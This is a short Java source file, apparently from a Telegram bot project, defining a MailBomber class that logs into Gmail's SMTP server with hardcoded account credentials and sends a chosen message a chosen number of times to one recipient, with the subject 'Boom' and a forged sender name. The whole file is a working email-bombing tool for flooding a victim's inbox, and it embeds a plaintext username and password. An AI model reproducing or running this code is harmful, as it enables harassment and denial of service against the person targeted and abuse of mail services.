package it.telegrambot.mailbomber;

import java.util.Properties;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MailBomber {

	public boolean sendMail(String to, String textMessage, int n) {

		final String user = "r1yserwdn2@gmail.com";
		final String password = "A12345678";


		Properties props = new Properties();
		props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP Host
		props.put("mail.smtp.port", "587"); // TLS Port
		props.put("mail.smtp.auth", "true"); // enable authentication
		props.put("mail.smtp.starttls.enable", "true"); // enable STARTTLS

		Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(user, password);
			}
		});

		String text = textMessage;
		for (int i = 0; i < n; i++) {
			//Compongo i messaggi
			try {
				MimeMessage message = new MimeMessage(session);
				message.addHeader("LOL", "XXX");
				message.setFrom(new InternetAddress("DIO"));
				message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
				message.setText(text, "utf-8", "html");
				message.setSubject("Boom");

				//Invio il messaggio
				Transport.send(message);

				System.out.println("message sent successfully..." + i + 1);

			} catch (MessagingException e) {
				e.printStackTrace();
				return false;
			}
		}
		return true;

	}
}